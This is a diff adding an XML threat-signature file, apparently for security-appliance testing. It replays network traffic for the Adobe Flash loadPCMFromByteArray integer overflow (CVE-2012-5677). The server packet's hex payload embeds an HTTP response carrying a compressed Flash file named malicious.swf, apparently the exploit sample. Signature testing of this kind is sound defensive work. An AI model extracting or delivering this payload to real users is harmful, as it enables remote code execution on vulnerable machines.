@@ -1,0 +1,92 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Adobe Flash Player loadPCMFromByteArray Integer Overflow"/>
+    <EngDesc display="true" value="An integer overflow vulnerability exists in Adobe Flash player. When the&#13;&#10;flash.media.Sound.loadPCMFromByteArray function is called with a large number of samples in the parameter,&#13;&#10;an integer overflow occurs. This is then used in the indexing of arrays leading to a potential buffer overflow.&#13;&#10;A remote attacker could exploit these vulnerabilities by enticing a user to visit a web page embedding a specially&#13;&#10;crafted Flash file. Successful exploitation could result in arbitrary code execution in the context of the currently&#13;&#10;logged in user."/>
+    <Intent display="true">
+      <item value="INTEGER_OVERFLOW"/>
+    </Intent>
+    <Protocol display="true" value="HTTP,HTTPS,IMAP,POP3,SMB/CIFS,SMTP,NFS"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Severity display="true" value="High"/>
+    <Known_Vendors_Affected display="true">
+      <item value="Adobe_Systems"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Adobe_Systems_AIR"/>
+      <item value="Adobe_Systems_Flash_Player"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Adobe_Systems_AIR_3.5.0.600_and_prior"/>
+      <item value="Adobe_Systems_Flash_Player_for_Android_3.x_prior_to_11.1.111.29"/>
+      <item value="Adobe_Systems_Flash_Player_for_Android_4.x_prior_to_11.1.115.34"/>
+      <item value="Adobe_Systems_Flash_Player_for_Linux_prior_to_11.2.202.258"/>
+      <item value="Adobe_Systems_Flash_Player_for_Macintosh_prior_to_11.5.502.136"/>
+      <item value="Adobe_Systems_Flash_Player_for_Windows_prior_to_11.5.502.135"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="TSL20121212-15"/>
+    <CVEID display="true" value="CVE-2012-5677"/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value="88353"/>
+    <Author display="true" value=""/>
+    <ID display="true" value="82d909e361fc93c616fe453b06fe080a"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value=""/>
+    <Suite display="true" value=""/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="network"/>
+    <AccessComplexity display="false" value="medium"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="partial"/>
+    <IntegImpact display="false" value="partial"/>
+    <AvailImpact display="false" value="partial"/>
+    <ImpactBias display="false" value=""/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="634974939252620341"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1362393035" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="C"/>
+    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="D"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="C"/>
+      <for index="D"/>
+    </for>
+    <for index="B">
+      <for index="C"/>
+      <for index="D"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="A" Count="">
+    <Ethernet srcMac="00:50:56:B4:03:71" destMac="00:50:56:B4:03:53" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="015A" Identification="95F2" FragmentOffset="0000" TTL="80" Protocol="06" HeaderChecksum="FA74" srcIP="172.16.8.114" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="1488" destPort="$HTTPdestPort" SeqNumber="2CE25917" AckNumber="8ECA1BCE" HeaderLength="05" WindowSize="FAF0" Checksum="A869" UrgentPointer="0000" Options="" Payload="474554202F7E7672742F6D616C6963696F75732E73776620485454502F312E310D0A486F73743A20646863703136342E7672742E74656C75732E636F6D0D0A557365722D4167656E743A204D6F7A696C6C612F352E30202857696E646F7773204E5420352E313B2072763A31392E3029204765636B6F2F32303130303130312046697265666F782F31392E300D0A4163636570743A20746578742F68746D6C2C6170706C69636174696F6E2F7868746D6C2B786D6C2C6170706C69636174696F6E2F786D6C3B713D302E392C2A2F2A3B713D302E380D0A4163636570742D4C616E67756167653A20656E2D55532C656E3B713D302E350D0A4163636570742D456E636F64696E673A20677A69702C206465666C6174650D0A436F6E6E656374696F6E3A206B6565702D616C6976650D0A0D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1">
+    <Output index="B" Count="">
+      <Ethernet srcMac="00:50:56:B4:03:53" destMac="00:50:56:B4:03:71" pktType="0800">
+        <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="054F" Identification="2C06" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="A06C" srcIP="$destIP" destIP="172.16.8.114" options="" CE="false" DF="true" MF="false">
+          <TCP srcPort="$HTTPdestPort" destPort="1488" SeqNumber="8ECA1BCE" AckNumber="2CE25A49" HeaderLength="05" WindowSize="3CB8" Checksum="EBE1" UrgentPointer="0000" Options="" Payload="485454502F312E3120323030204F4B0D0A446174653A204672692C2032322046656220323031332031363A32323A343320474D540D0A5365727665723A204170616368652F322E322E323220285562756E7475290D0A4C6173742D4D6F6469666965643A204672692C2032322046656220323031332031353A33343A303620474D540D0A455461673A20223165366538352D3365652D34643635316562663135373830220D0A4163636570742D52616E6765733A2062797465730D0A436F6E74656E742D4C656E6774683A20313030360D0A4B6565702D416C6976653A2074696D656F75743D352C206D61783D3130300D0A436F6E6E656374696F6E3A204B6565702D416C6976650D0A436F6E74656E742D547970653A206170706C69636174696F6E2F782D73686F636B776176652D666C6173680D0A0D0A435753120B060000780165534D6FDB4610DD252951D41725DB916DC549E8468511A01229394860C516AA5A5191148E83E8D022B020ACC8A5C5862209726959A7FA56A0B7FE83B6F7FE815E7AEAA917D7419B7F50F466F517B8BB94639BE9020431F3DE3CBE991D1E03F11480650F80BB10748A2B00806F167F87006CFB86D97CD5E92AC763DB099A34DAD91811E23555753299D4269B35D73F54EB5B5B5BAAD6501B8D2A655483A943D071D509EE6FB422810E0E74DFF288E53A0A13444337243B1B1B97AA867E25EA85BE1D491ABA8A6D3CC60E09D47AAD4E850CBD69BAFE189116F23CDBD21193538FABC1C8D5DF4CD011AE9A360A46DBEA3591D5108BD8B8D536DC2156BA363E561E2AEDEBFA883DA730B2716DB475A34DC4AA6BBA3B563DDF35429D7A32A954547CB3844978E1D0B68211F65BA1F3C671274EC4BACE328EEE6344DC38E37D8EE136720E4374885B4F5F44D55771E41111DCEAE2A1D2687CA234B4FAE6DC06CB6EAB6CBA37A67D99A117D802F942B8FA62BFFAB2DDEB7DB9FFAA034E657ACBB1D329FCC36F835DEEE2E2E2759AA750923E42F2C7D773D65EF33B6E87EEC46FE93D6439E0D7A55F2887C6200A0BA006F8137A846F7FFE02808F8528FB78B779D071F530BA48053986D2C38458CE617070E49383BDA972851E04BEFEE409ABAAA1400CD0D8B37190184E090EA025B179F7DCD031A4CF68A6EDFB682A5D722BDAFAE55D5DDF53BBB7A93634ED913A0C2D9B7E6F29DA8D9A61059E8DA6CD9EE75B0457E2C9CE1CDC1F7E8D75B2EBD21DB61CECDF8B939E3904FB4827D6119E136FC7F198C8DA1CC3476C8D9B4FD98BE188E8743F32733024961D4813E6877596889ABCC4C6D8B050CA73038BEDFA92ED22E3E5EE5ED777C7F121A86C12C2916B19B9989BE4BCCFE4DCA9FC8181EC4D77B998F1E2FFDA2CC5F0ABE9AC0D0687EE80B8039DEEF3C0C0A6E5445E07236C7B3C75CED71F3F5A7E4FFA10AF371E1613302195B8652E955E816558CE94B3E55C395F964B85D26269A5B496C8418E1712493125A533D95C3616DD0CF209C6938B520A8AB99454E4A4055ECC2F484B9C748B13F9659187A2BC2AF265B1705B94EF88F25D51BE27AD0A748939005225BAC81CE014B8FED17DB85E81525A4A46DB0D39287520C5200F204C49FCA9F639DD7B3E21A5A7FFF2B3D4A95601E41D7D3F03E75000E9739880997398E4B2E750E4E559BA0A2BC60FE4CF59A60F9F4370C2FD35CBB18A42010069963FABB4BB3C7C30CBBDFD9EBC7B5B11AADC4FB7FEBEB898C97DE1B9004E12BA302B9C55004ACE8A43E1EC8FAEC83D982D50031C47CD6C9D6AD44212837EC6CC68FDAC99D5FA3933A7F5F3665EEBCBA6ACF5D3665AEB17CCC257E04E744612AD10A880B478F5EF7E4A7BFF0F0AF6C732" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IP>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
